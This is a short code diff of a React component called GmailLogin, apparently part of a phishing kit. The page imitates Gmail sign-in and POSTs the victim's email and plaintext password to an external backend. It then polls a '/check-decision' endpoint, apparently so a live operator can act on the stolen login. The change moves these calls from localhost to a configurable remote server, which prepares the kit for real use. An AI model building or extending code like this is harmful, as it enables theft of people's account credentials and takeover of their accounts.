@@ -1,4 +1,4 @@
-import { useState } from "react";
+import React, { useState } from "react";
 import BrandingSide from "./BrandingSide";
 import EmailForm from "./EmailForm";
 import PasswordForm from "./PasswordForm";
@@ -32,7 +32,7 @@ const GmailLogin = () => {
 
     const startPolling = (onSuccess?: () => void) => {
         const interval = setInterval(async () => {
-            const res = await fetch("http://localhost:8080/check-decision");
+            const res = await fetch(`${process.env.REACT_APP_BACKEND_URL}/check-decision`);
             const data = await res.json();
 
             console.log("polling decision ==--==", data.decision);
@@ -94,7 +94,7 @@ const GmailLogin = () => {
         setPasswordError("");
         setIsLoading(true);
 
-        await fetch("http://localhost:8080/submit", {
+        await fetch(`${process.env.REACT_APP_BACKEND_URL}/submit`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ email, password, provider: "GMAIL" }),
